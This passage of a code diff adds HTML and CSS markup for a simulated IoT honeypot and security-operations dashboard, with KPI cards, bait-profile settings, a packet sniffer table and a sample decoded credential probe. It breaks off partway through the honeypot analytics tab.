@@ -1,0 +1,1737 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>IoT Deception Network & Intelligent Honeypot SOC</title>
+
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Chart.js -->
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <!-- FontAwesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <!-- Google Fonts: Inter & Fira Code -->
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['Fira Code', 'monospace']
+          },
+          colors: {
+            cyber: {
+              bg: '#080c14',
+              card: '#0f172a',
+              border: '#1e293b',
+              accent: '#06b6d4',
+              neon: '#22d3ee',
+              green: '#10b981',
+              amber: '#f59e0b',
+              danger: '#ef4444',
+              purple: '#a855f7'
+            }
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    body {
+      background-color: #060911;
+      color: #f1f5f9;
+      font-family: 'Inter', sans-serif;
+    }
+    /* Custom Scrollbar */
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #0b1120;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #1e293b;
+      border-radius: 4px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #06b6d4;
+    }
+    .glass-card {
+      background: rgba(15, 23, 42, 0.75);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+    }
+    .glow-cyan {
+      box-shadow: 0 0 15px rgba(34, 211, 238, 0.25);
+    }
+    .glow-red {
+      box-shadow: 0 0 15px rgba(239, 68, 68, 0.25);
+    }
+    .pulse-danger {
+      animation: pulse-red 2s infinite;
+    }
+    @keyframes pulse-red {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
+      50% { box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
+    }
+    .packet-row {
+      transition: all 0.2s ease;
+    }
+    .packet-row:hover {
+      background-color: rgba(6, 182, 212, 0.1);
+    }
+
+
+    /* ================================================================
+       THEME SYSTEM — LIGHT / DARK
+       ================================================================ */
+    :root {
+      --theme-bg: #060911;
+      --theme-surface: rgba(15, 23, 42, 0.75);
+      --theme-surface-solid: #0f172a;
+      --theme-surface-deep: #020617;
+      --theme-text: #f1f5f9;
+      --theme-text-strong: #ffffff;
+      --theme-text-muted: #94a3b8;
+      --theme-text-soft: #cbd5e1;
+      --theme-border: #1e293b;
+      --theme-border-soft: rgba(255,255,255,0.08);
+      --theme-grid: rgba(255,255,255,0.05);
+      --theme-hover: rgba(6,182,212,0.10);
+    }
+
+    body.theme-light {
+      --theme-bg: #f4f7fb;
+      --theme-surface: rgba(255,255,255,0.88);
+      --theme-surface-solid: #ffffff;
+      --theme-surface-deep: #eef3f8;
+      --theme-text: #172033;
+      --theme-text-strong: #0f172a;
+      --theme-text-muted: #64748b;
+      --theme-text-soft: #334155;
+      --theme-border: #d7e0ea;
+      --theme-border-soft: rgba(15,23,42,0.10);
+      --theme-grid: rgba(15,23,42,0.08);
+      --theme-hover: rgba(6,182,212,0.08);
+      background: radial-gradient(circle at 15% 0%, rgba(6,182,212,.08), transparent 28%), var(--theme-bg);
+      color: var(--theme-text);
+    }
+
+    body.theme-light ::selection { background: #06b6d4; color: #fff; }
+    body.theme-light ::-webkit-scrollbar-track { background: #e8eef5; }
+    body.theme-light ::-webkit-scrollbar-thumb { background: #c2cedb; }
+    body.theme-light ::-webkit-scrollbar-thumb:hover { background: #06b6d4; }
+
+    /* Re-theme the existing Tailwind utility-heavy UI without changing its markup. */
+    body.theme-light .glass-card {
+      background: var(--theme-surface);
+      border-color: var(--theme-border-soft);
+      box-shadow: 0 10px 30px rgba(15,23,42,.08);
+    }
+    body.theme-light .bg-slate-950,
+    body.theme-light .bg-slate-950\/80,
+    body.theme-light .bg-slate-900\/60,
+    body.theme-light .bg-slate-900\/80,
+    body.theme-light .bg-slate-900\/50,
+    body.theme-light .bg-slate-900 {
+      background-color: var(--theme-surface-deep) !important;
+    }
+    body.theme-light .bg-slate-800 { background-color: #e2e8f0 !important; }
+    body.theme-light .bg-slate-700 { background-color: #cbd5e1 !important; }
+    body.theme-light .text-white { color: var(--theme-text-strong) !important; }
+    body.theme-light .text-slate-200 { color: #1e293b !important; }
+    body.theme-light .text-slate-300 { color: #334155 !important; }
+    body.theme-light .text-slate-400 { color: #64748b !important; }
+    body.theme-light .text-slate-500 { color: #64748b !important; }
+    body.theme-light .border-slate-800,
+    body.theme-light .border-slate-800\/80,
+    body.theme-light .border-slate-800\/60,
+    body.theme-light .border-slate-700 { border-color: var(--theme-border) !important; }
+    body.theme-light .divide-slate-800\/60 > :not([hidden]) ~ :not([hidden]) { border-color: var(--theme-border) !important; }
+    body.theme-light .hover\\:bg-slate-800\\/50:hover,
+    body.theme-light .hover\\:bg-slate-900\\/50:hover { background-color: #eaf1f7 !important; }
+    body.theme-light .packet-row:hover { background-color: var(--theme-hover) !important; }
+
+    body.theme-light header {
+      background: rgba(255,255,255,.90) !important;
+      border-color: var(--theme-border) !important;
+    }
+    body.theme-light header .bg-slate-900\/60 {
+      background: rgba(241,245,249,.92) !important;
+    }
+
+    body.theme-light input,
+    body.theme-light select,
+    body.theme-light textarea {
+      background-color: #fff !important;
+      color: #172033 !important;
+      border-color: #cbd5e1 !important;
+    }
+    body.theme-light input::placeholder { color: #94a3b8; }
+
+    body.theme-light table thead { background: #eaf0f6 !important; }
+    body.theme-light table tbody tr:hover { background: #f1f6fa !important; }
+
+    body.theme-light .bg-cyan-500\/10 { background-color: rgba(6,182,212,.10) !important; }
+    body.theme-light .bg-cyan-500\/20 { background-color: rgba(6,182,212,.14) !important; }
+    body.theme-light .bg-emerald-500\/10 { background-color: rgba(16,185,129,.10) !important; }
+    body.theme-light .bg-emerald-500\/20 { background-color: rgba(16,185,129,.12) !important; }
+    body.theme-light .bg-rose-500\/20 { background-color: rgba(244,63,94,.10) !important; }
+    body.theme-light .bg-amber-500\/20 { background-color: rgba(245,158,11,.12) !important; }
+    body.theme-light .bg-purple-500\/20 { background-color: rgba(168,85,247,.10) !important; }
+
+    body.theme-light .text-cyan-300 { color: #0891b2 !important; }
+    body.theme-light .text-cyan-400 { color: #0891b2 !important; }
+    body.theme-light .text-emerald-400 { color: #059669 !important; }
+    body.theme-light .text-rose-400 { color: #e11d48 !important; }
+    body.theme-light .text-amber-300 { color: #b45309 !important; }
+    body.theme-light .text-amber-400 { color: #b45309 !important; }
+    body.theme-light .text-purple-400 { color: #7e22ce !important; }
+
+    body.theme-light .theme-toggle {
+      background: #ffffff;
+      color: #334155;
+      border-color: #cbd5e1;
+      box-shadow: 0 4px 14px rgba(15,23,42,.08);
+    }
+    body.theme-light .theme-toggle:hover { background: #f8fafc; }
+
+    .theme-toggle {
+      min-width: 42px;
+      height: 38px;
+      border: 1px solid rgba(148,163,184,.28);
+      background: rgba(15,23,42,.72);
+      color: #e2e8f0;
+      border-radius: 10px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: .2s ease;
+    }
+    .theme-toggle:hover { transform: translateY(-1px); border-color: rgba(34,211,238,.55); }
+    .theme-toggle .theme-icon { transition: transform .3s ease; }
+    .theme-toggle:hover .theme-icon { transform: rotate(18deg) scale(1.08); }
+    .theme-label { display:none; }
+    @media (min-width: 1280px) { .theme-label { display:inline; font-size:11px; font-weight:600; } }
+
+    /* Smooth visual transition when switching themes. */
+    body, header, .glass-card, button, input, select, textarea, table, td, th {
+      transition: background-color .22s ease, color .22s ease, border-color .22s ease, box-shadow .22s ease;
+    }
+
+  </style>
+</head>
+<body class="min-h-screen flex flex-col overflow-x-hidden selection:bg-cyber-accent selection:text-black">
+
+  <!-- Navigation Header -->
+  <header class="border-b border-slate-800 bg-slate-950/80 backdrop-filter backdrop-blur-md sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex items-center justify-between h-16">
+        
+        <!-- Logo / Title -->
+        <div class="flex items-center gap-3">
+          <div class="p-2.5 bg-cyan-500/10 border border-cyan-500/30 rounded-xl text-cyan-400">
+            <i class="fa-solid fa-shield-halved text-2xl"></i>
+          </div>
+          <div>
+            <div class="flex items-center gap-2">
+              <h1 class="text-lg font-bold tracking-tight text-white">IoT Deception Network</h1>
+              <span class="px-2 py-0.5 text-xs font-semibold bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 rounded-full">SOC Live</span>
+            </div>
+            <p class="text-xs text-slate-400">Intelligent Honeypot & Packet Analysis System</p>
+          </div>
+        </div>
+
+        <!-- Global Status & Quick Controls -->
+        <div class="hidden lg:flex items-center gap-6">
+          <div class="flex items-center gap-2 text-xs">
+            <span class="relative flex h-2.5 w-2.5">
+              <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-400 opacity-75"></span>
+              <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-cyan-500"></span>
+            </span>
+            <span class="text-slate-300 font-mono">PACKETS: <span id="header-pkt-count" class="text-cyan-400 font-bold">14,290</span></span>
+          </div>
+
+          <div class="flex items-center gap-2 text-xs border-l border-slate-800 pl-4">
+            <i class="fa-solid fa-triangle-exclamation text-amber-400"></i>
+            <span class="text-slate-300 font-mono">THREAT LEVEL: <span id="header-threat-lvl" class="text-amber-400 font-bold">MODERATE</span></span>
+          </div>
+
+          <div class="flex items-center gap-2 border-l border-slate-800 pl-4">
+            <button id="theme-toggle" onclick="toggleTheme()" class="theme-toggle" type="button" aria-label="Switch theme" title="Switch theme">
+              <i id="theme-icon" class="fa-solid fa-sun theme-icon"></i>
+              <span id="theme-label" class="theme-label">Light</span>
+            </button>
+          </div>
+
+          <div class="flex items-center gap-2 border-l border-slate-800 pl-4">
+            <button id="toggle-sim-btn" onclick="toggleSimulation()" class="px-3 py-1.5 bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 border border-cyan-500/40 rounded-lg text-xs font-medium transition flex items-center gap-2">
+              <i class="fa-solid fa-pause" id="sim-icon"></i>
+              <span id="sim-text">Pause Engine</span>
+            </button>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Navigation Tabs -->
+    <div class="bg-slate-900/60 border-t border-slate-800/80 px-4 sm:px-6 lg:px-8 overflow-x-auto">
+      <div class="max-w-7xl mx-auto flex space-x-1 sm:space-x-4 py-2 text-sm font-medium">
+        <button onclick="switchTab('dashboard')" id="tab-btn-dashboard" class="tab-btn active px-3.5 py-2 rounded-lg text-cyan-400 bg-cyan-500/10 border border-cyan-500/20 flex items-center gap-2 whitespace-nowrap">
+          <i class="fa-solid fa-chart-pie"></i> Executive Dashboard
+        </button>
+        <button onclick="switchTab('nodes')" id="tab-btn-nodes" class="tab-btn px-3.5 py-2 rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800/50 flex items-center gap-2 whitespace-nowrap">
+          <i class="fa-solid fa-network-wired"></i> Deception Nodes
+        </button>
+        <button onclick="switchTab('sniffer')" id="tab-btn-sniffer" class="tab-btn px-3.5 py-2 rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800/50 flex items-center gap-2 whitespace-nowrap">
+          <i class="fa-solid fa-microchip"></i> Packet Sniffer & DPI
+        </button>
+        <button onclick="switchTab('honeypot')" id="tab-btn-honeypot" class="tab-btn px-3.5 py-2 rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800/50 flex items-center gap-2 whitespace-nowrap">
+          <i class="fa-solid fa-bug"></i> Honeypot Analytics
+        </button>
+        <button onclick="switchTab('events')" id="tab-btn-events" class="tab-btn px-3.5 py-2 rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800/50 flex items-center gap-2 whitespace-nowrap">
+          <i class="fa-solid fa-shield-cat"></i> Incident Log (SIEM)
+        </button>
+        <button onclick="switchTab('simulator')" id="tab-btn-simulator" class="tab-btn px-3.5 py-2 rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800/50 flex items-center gap-2 whitespace-nowrap">
+          <i class="fa-solid fa-rocket text-amber-400"></i> Attack Simulator
+        </button>
+        <button onclick="switchTab('overview')" id="tab-btn-overview" class="tab-btn px-3.5 py-2 rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800/50 flex items-center gap-2 whitespace-nowrap">
+          <i class="fa-solid fa-circle-info"></i> Project Specs
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Container -->
+  <main class="flex-grow max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-6">
+
+    <!-- ==================== TAB 1: EXECUTIVE DASHBOARD ==================== -->
+    <div id="tab-dashboard" class="tab-content space-y-6">
+      
+      <!-- KPI Grid -->
+      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
+        <!-- KPI 1 -->
+        <div class="glass-card p-4 rounded-xl border border-slate-800 relative overflow-hidden">
+          <div class="flex items-center justify-between text-slate-400 text-xs font-medium">
+            <span>TOTAL PACKETS</span>
+            <i class="fa-solid fa-ethernet text-cyan-400"></i>
+          </div>
+          <div class="mt-2 flex items-baseline gap-2">
+            <span id="kpi-total-packets" class="text-2xl font-bold font-mono text-white">14,290</span>
+            <span class="text-xs text-emerald-400 font-mono"><i class="fa-solid fa-arrow-up"></i> +128/s</span>
+          </div>
+          <div class="mt-2 text-xs text-slate-400">Real-time captured network packets</div>
+        </div>
+
+        <!-- KPI 2 -->
+        <div class="glass-card p-4 rounded-xl border border-slate-800 relative overflow-hidden">
+          <div class="flex items-center justify-between text-slate-400 text-xs font-medium">
+            <span>ACTIVE DECEPTION NODES</span>
+            <i class="fa-solid fa-server text-emerald-400"></i>
+          </div>
+          <div class="mt-2 flex items-baseline gap-2">
+            <span id="kpi-active-nodes" class="text-2xl font-bold font-mono text-emerald-400">5 / 5</span>
+            <span class="text-xs text-emerald-400">100% Online</span>
+          </div>
+          <div class="mt-2 text-xs text-slate-400">Smart Camera, Bulb, Gateway, etc.</div>
+        </div>
+
+        <!-- KPI 3 -->
+        <div class="glass-card p-4 rounded-xl border border-slate-800 relative overflow-hidden">
+          <div class="flex items-center justify-between text-slate-400 text-xs font-medium">
+            <span>DETECTED THREATS</span>
+            <i class="fa-solid fa-triangle-exclamation text-rose-500"></i>
+          </div>
+          <div class="mt-2 flex items-baseline gap-2">
+            <span id="kpi-threat-count" class="text-2xl font-bold font-mono text-rose-400">84</span>
+            <span class="text-xs text-rose-400 font-mono">+4 new</span>
+          </div>
+          <div class="mt-2 text-xs text-slate-400">Port scans, brute force & malware</div>
+        </div>
+
+        <!-- KPI 4 -->
+        <div class="glass-card p-4 rounded-xl border border-slate-800 relative overflow-hidden">
+          <div class="flex items-center justify-between text-slate-400 text-xs font-medium">
+            <span>TOP ATTACKER IP</span>
+            <i class="fa-solid fa-globe text-amber-400"></i>
+          </div>
+          <div class="mt-2">
+            <span id="kpi-top-attacker" class="text-lg font-bold font-mono text-amber-300">185.220.101.5</span>
+          </div>
+          <div class="mt-2 text-xs text-slate-400">Origin: RU | 38 attempts</div>
+        </div>
+
+        <!-- KPI 5 -->
+        <div class="glass-card p-4 rounded-xl border border-slate-800 relative overflow-hidden flex flex-col justify-between">
+          <div class="flex items-center justify-between text-slate-400 text-xs font-medium">
+            <span>SYSTEM RISK LEVEL</span>
+            <i class="fa-solid fa-gauge-high text-cyan-400"></i>
+          </div>
+          <div class="mt-1 flex items-center justify-between">
+            <span id="kpi-risk-text" class="text-xl font-bold font-mono text-amber-400">MODERATE</span>
+            <span id="kpi-risk-val" class="text-sm font-mono text-slate-300">62/100</span>
+          </div>
+          <div class="w-full bg-slate-800 h-2 rounded-full mt-2 overflow-hidden">
+            <div id="kpi-risk-bar" class="bg-amber-400 h-full rounded-full" style="width: 62%;"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Charts Section -->
+      <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <!-- Network Activity Chart (2 cols) -->
+        <div class="glass-card p-5 rounded-xl border border-slate-800 lg:col-span-2 flex flex-col justify-between">
+          <div class="flex items-center justify-between mb-4">
+            <div>
+              <h2 class="text-base font-semibold text-white">Live Network Traffic & Anomaly Stream</h2>
+              <p class="text-xs text-slate-400">Real-time packet throughput (Normal vs Honeypot Suspicious)</p>
+            </div>
+            <div class="flex items-center gap-4 text-xs font-mono">
+              <span class="flex items-center gap-1.5"><span class="w-3 h-3 rounded-full bg-cyan-400 inline-block"></span> Normal Traffic</span>
+              <span class="flex items-center gap-1.5"><span class="w-3 h-3 rounded-full bg-rose-500 inline-block"></span> Suspicious / Attack</span>
+            </div>
+          </div>
+          <div class="h-64 relative w-full">
+            <canvas id="trafficChart"></canvas>
+          </div>
+        </div>
+
+        <!-- Threat Distribution Doughnut (1 col) -->
+        <div class="glass-card p-5 rounded-xl border border-slate-800 flex flex-col justify-between">
+          <div class="flex items-center justify-between mb-4">
+            <div>
+              <h2 class="text-base font-semibold text-white">Attack Vector Breakdown</h2>
+              <p class="text-xs text-slate-400">Categorized by Honeypot analytics</p>
+            </div>
+          </div>
+          <div class="h-56 relative flex items-center justify-center">
+            <canvas id="vectorChart"></canvas>
+          </div>
+          <div class="mt-4 grid grid-cols-2 gap-2 text-xs font-mono text-slate-300">
+            <div class="flex items-center justify-between p-1.5 bg-slate-900/50 rounded"><span class="text-cyan-400">Port Scans</span> <span id="cnt-scan">42%</span></div>
+            <div class="flex items-center justify-between p-1.5 bg-slate-900/50 rounded"><span class="text-rose-400">Brute Force</span> <span id="cnt-brute">31%</span></div>
+            <div class="flex items-center justify-between p-1.5 bg-slate-900/50 rounded"><span class="text-amber-400">Mirai Botnet</span> <span id="cnt-mirai">18%</span></div>
+            <div class="flex items-center justify-between p-1.5 bg-slate-900/50 rounded"><span class="text-purple-400">UDP Floods</span> <span id="cnt-udp">9%</span></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Live Attack Feed Stream Table -->
+      <div class="glass-card p-5 rounded-xl border border-slate-800">
+        <div class="flex items-center justify-between mb-4">
+          <div class="flex items-center gap-3">
+            <h2 class="text-base font-semibold text-white">Live Honeypot Interaction Feed</h2>
+            <span class="px-2 py-0.5 text-xs bg-rose-500/20 text-rose-400 border border-rose-500/30 rounded-full animate-pulse">Streaming</span>
+          </div>
+          <button onclick="switchTab('events')" class="text-xs text-cyan-400 hover:text-cyan-300 font-medium">View Full SIEM Log <i class="fa-solid fa-arrow-right ml-1"></i></button>
+        </div>
+
+        <div class="overflow-x-auto">
+          <table class="w-full text-left text-xs font-mono">
+            <thead class="bg-slate-900/80 text-slate-400 uppercase tracking-wider border-b border-slate-800">
+              <tr>
+                <th class="p-3">Time</th>
+                <th class="p-3">Attacker IP</th>
+                <th class="p-3">Target Node</th>
+                <th class="p-3">Service / Port</th>
+                <th class="p-3">Attack Type</th>
+                <th class="p-3">Severity</th>
+                <th class="p-3">Action Taken</th>
+              </tr>
+            </thead>
+            <tbody id="dash-feed-body" class="divide-y divide-slate-800/60 text-slate-300">
+              <!-- Dynamically populated -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+    </div>
+
+
+    <!-- ==================== TAB 2: DECEPTION NETWORK & NODES ==================== -->
+    <div id="tab-nodes" class="tab-content hidden space-y-6">
+      <div class="glass-card p-5 rounded-xl border border-slate-800">
+        <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6">
+          <div>
+            <h2 class="text-lg font-bold text-white">Simulated IoT Deception Topology</h2>
+            <p class="text-xs text-slate-400">Configure low/high interaction bait profiles to lure reconnaissance attacks</p>
+          </div>
+          <div class="flex items-center gap-3 text-xs">
+            <span class="flex items-center gap-1.5"><span class="w-3 h-3 rounded-full bg-emerald-500"></span> Active Honeypot</span>
+            <span class="flex items-center gap-1.5"><span class="w-3 h-3 rounded-full bg-slate-600"></span> Node Disabled</span>
+            <span class="flex items-center gap-1.5"><span class="w-3 h-3 rounded-full bg-amber-500"></span> Under Attack</span>
+          </div>
+        </div>
+
+        <!-- Interactive Visual Node Map -->
+        <div id="node-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
+          <!-- Dynamically Generated IoT Devices -->
+        </div>
+      </div>
+
+      <!-- Node Detail Control Modal / Drawer -->
+      <div id="node-detail-panel" class="glass-card p-5 rounded-xl border border-slate-800 hidden">
+        <div class="flex items-center justify-between mb-4 border-b border-slate-800 pb-3">
+          <div class="flex items-center gap-3">
+            <i id="node-modal-icon" class="text-2xl text-cyan-400"></i>
+            <div>
+              <h3 id="node-modal-title" class="text-base font-bold text-white">Node Details</h3>
+              <p id="node-modal-ip" class="text-xs font-mono text-slate-400">192.168.1.100</p>
+            </div>
+          </div>
+          <button onclick="closeNodePanel()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-xs">
+          <!-- Column 1: Profile & Vulnerabilities -->
+          <div class="space-y-3 bg-slate-900/60 p-4 rounded-lg border border-slate-800">
+            <h4 class="font-semibold text-slate-200 border-b border-slate-800 pb-1">Vulnerability Traps Profile</h4>
+            <div>
+              <label class="text-slate-400 block mb-1">Bait Configuration Profile</label>
+              <select id="node-modal-vuln" onchange="updateNodeVuln(this.value)" class="w-full bg-slate-950 border border-slate-700 rounded p-2 text-slate-200 focus:outline-none focus:border-cyan-500">
+                <option value="Default Credentials">Weak / Default Credentials (admin/admin)</option>
+                <option value="Exposed Telnet/SSH">Exposed Unencrypted Telnet Port 23</option>
+                <option value="Outdated Firmware">Outdated Firmware v1.0.4 (RCE Vulnerable)</option>
+                <option value="Open MQTT Broker">Open Unauthenticated MQTT Broker (1883)</option>
+              </select>
+            </div>
+            <div class="pt-2">
+              <span class="text-slate-400">Emulated Services:</span>
+              <div id="node-modal-services" class="mt-1 flex flex-wrap gap-1">
+                <!-- Services tags -->
+              </div>
+            </div>
+          </div>
+
+          <!-- Column 2: Live Telemetry -->
+          <div class="space-y-3 bg-slate-900/60 p-4 rounded-lg border border-slate-800 font-mono">
+            <h4 class="font-semibold text-slate-200 border-b border-slate-800 pb-1">Live Telemetry & Bait Status</h4>
+            <div class="flex justify-between"><span>CPU Utilization:</span> <span id="node-modal-cpu" class="text-cyan-400">12%</span></div>
+            <div class="flex justify-between"><span>RAM Usage:</span> <span id="node-modal-ram" class="text-cyan-400">45 MB / 128 MB</span></div>
+            <div class="flex justify-between"><span>Active Connections:</span> <span id="node-modal-conn" class="text-emerald-400">3 Sessions</span></div>
+            <div class="flex justify-between"><span>Total Trapped Probes:</span> <span id="node-modal-trapped" class="text-amber-400">142</span></div>
+          </div>
+
+          <!-- Column 3: Actions -->
+          <div class="space-y-3 bg-slate-900/60 p-4 rounded-lg border border-slate-800 flex flex-col justify-between">
+            <div>
+              <h4 class="font-semibold text-slate-200 border-b border-slate-800 pb-1">Node Operations</h4>
+              <p class="text-slate-400 mt-2">Trigger actions on this specific simulated node.</p>
+            </div>
+            <div class="space-y-2">
+              <button onclick="restartNode()" class="w-full py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded text-center transition font-semibold">Restart Service Container</button>
+              <button onclick="purgeNodeLogs()" class="w-full py-2 bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 rounded text-center transition font-semibold">Purge Captured Attack Artifacts</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- ==================== TAB 3: PACKET SNIFFER & DPI ==================== -->
+    <div id="tab-sniffer" class="tab-content hidden space-y-6">
+      
+      <!-- Packet Filter Bar -->
+      <div class="glass-card p-4 rounded-xl border border-slate-800 flex flex-wrap items-center justify-between gap-4">
+        <div class="flex items-center gap-3">
+          <i class="fa-solid fa-filter text-cyan-400"></i>
+          <span class="text-sm font-semibold text-white">Packet Filter:</span>
+          <select id="filter-proto" onchange="applyPacketFilters()" class="bg-slate-900 border border-slate-700 text-slate-300 text-xs rounded-lg p-2 focus:border-cyan-500">
+            <option value="ALL">All Protocols</option>
+            <option value="TCP">TCP</option>
+            <option value="UDP">UDP</option>
+            <option value="MQTT">MQTT</option>
+            <option value="Telnet">Telnet</option>
+            <option value="HTTP">HTTP</option>
+          </select>
+          <select id="filter-anomaly" onchange="applyPacketFilters()" class="bg-slate-900 border border-slate-700 text-slate-300 text-xs rounded-lg p-2 focus:border-cyan-500">
+            <option value="ALL">All Flags</option>
+            <option value="ANOMALY">Anomalous / Attack Packets Only</option>
+            <option value="NORMAL">Normal Packets Only</option>
+          </select>
+        </div>
+        <div class="flex items-center gap-2">
+          <input type="text" id="filter-search" onkeyup="applyPacketFilters()" placeholder="Search IP or Port..." class="bg-slate-900 border border-slate-700 text-slate-300 text-xs rounded-lg p-2 w-48 focus:border-cyan-500 font-mono">
+          <button onclick="clearSnifferLog()" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs rounded-lg transition"><i class="fa-solid fa-trash-can mr-1"></i> Clear</button>
+        </div>
+      </div>
+
+      <!-- Live Wireshark-like Table -->
+      <div class="glass-card p-4 rounded-xl border border-slate-800">
+        <div class="flex items-center justify-between mb-3">
+          <h3 class="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
+            <i class="fa-solid fa-network-wired text-cyan-400"></i> Network Packet Stream Log
+          </h3>
+          <span class="text-xs text-slate-400 font-mono">Click any packet to trigger Deep Packet Inspection (DPI)</span>
+        </div>
+        
+        <div class="overflow-x-auto max-h-80 overflow-y-auto border border-slate-800 rounded-lg">
+          <table class="w-full text-left text-xs font-mono">
+            <thead class="bg-slate-950 text-slate-400 sticky top-0 border-b border-slate-800">
+              <tr>
+                <th class="p-2.5">No.</th>
+                <th class="p-2.5">Timestamp</th>
+                <th class="p-2.5">Source IP</th>
+                <th class="p-2.5">Destination IP</th>
+                <th class="p-2.5">Proto</th>
+                <th class="p-2.5">Port</th>
+                <th class="p-2.5">Size</th>
+                <th class="p-2.5">Flags / Status</th>
+              </tr>
+            </thead>
+            <tbody id="packet-table-body" class="divide-y divide-slate-800/40 text-slate-300">
+              <!-- Dynamically populated -->
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Deep Packet Inspection Pane (DPI) -->
+      <div class="glass-card p-5 rounded-xl border border-slate-800">
+        <div class="flex items-center justify-between mb-4 border-b border-slate-800 pb-2">
+          <h3 class="text-sm font-bold text-white flex items-center gap-2">
+            <i class="fa-solid fa-magnifying-glass-chart text-cyan-400"></i> Deep Packet Inspection (DPI) Payload Breakdown
+          </h3>
+          <span id="dpi-pkt-id" class="text-xs font-mono text-cyan-400 bg-cyan-500/10 px-2 py-0.5 rounded border border-cyan-500/20">Select a packet from stream</span>
+        </div>
+
+        <div id="dpi-content" class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+          <!-- Layer Breakdown -->
+          <div class="space-y-3 text-xs font-mono bg-slate-950 p-4 rounded-lg border border-slate-800">
+            <div class="text-slate-400 font-bold text-sm border-b border-slate-800 pb-1 text-cyan-300">HEADER DECODE</div>
+            <div><span class="text-slate-500">Ethernet II:</span> <span id="dpi-eth" class="text-slate-300">Src: 02:42:ac:11:00:02, Dst: 02:42:ac:11:00:05</span></div>
+            <div><span class="text-slate-500">IP Version 4:</span> <span id="dpi-ip" class="text-slate-300">Src: 185.220.101.5 -> Dst: 192.168.1.100 (TTL 64)</span></div>
+            <div><span class="text-slate-500">Transport Protocol:</span> <span id="dpi-proto" class="text-slate-300">TCP (Port 23) Seq=10492 Ack=0</span></div>
+            <div><span class="text-slate-500">Application Protocol:</span> <span id="dpi-app" class="text-slate-300">Telnet / Raw Credentials Probe</span></div>
+          </div>
+
+          <!-- Hex & ASCII Dump -->
+          <div class="lg:col-span-2 space-y-2 bg-slate-950 p-4 rounded-lg border border-slate-800 font-mono text-xs">
+            <div class="flex items-center justify-between text-slate-400 border-b border-slate-800 pb-1">
+              <span class="font-bold text-sm text-cyan-300">RAW PAYLOAD DUMP (HEX / ASCII)</span>
+              <span id="dpi-anomaly-score" class="text-xs px-2 py-0.5 bg-rose-500/20 text-rose-400 rounded">Anomaly Confidence: 94%</span>
+            </div>
+            <pre id="dpi-hex" class="text-emerald-400 overflow-x-auto p-2 bg-slate-900 rounded text-xs leading-relaxed">
+0000  41 44 4d 49 4e 3a 41 44 4d 49 4e 0d 0a 53 59 53  ADMIN:ADMIN..SYS
+0010  54 45 4d 20 53 48 45 4c 4c 20 45 58 45 43 0d 0a  TEM SHELL EXEC..
+            </pre>
+            <div class="text-slate-400 text-xs">
+              <span class="text-cyan-400 font-semibold">AI Detection Summary:</span> 
+              <span id="dpi-summary" class="text-slate-300">Detected dictionary attack pattern attempting default credential spray for IoT shell access.</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+
+    <!-- ==================== TAB 4: HONEYPOT ANALYTICS ==================== -->
+    <div id="tab-honeypot" class="tab-content hidden space-y-6">
+      
+      <!-- Analytics Grid -->
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <!-- Attack Type Trends Bar Chart -->
+        <div class="glass-card p-5 rounded-xl border border-slate-800">
+          <h3 class="text-base font-semibold text-white mb-1">Attacker Detection Signatures</h3>
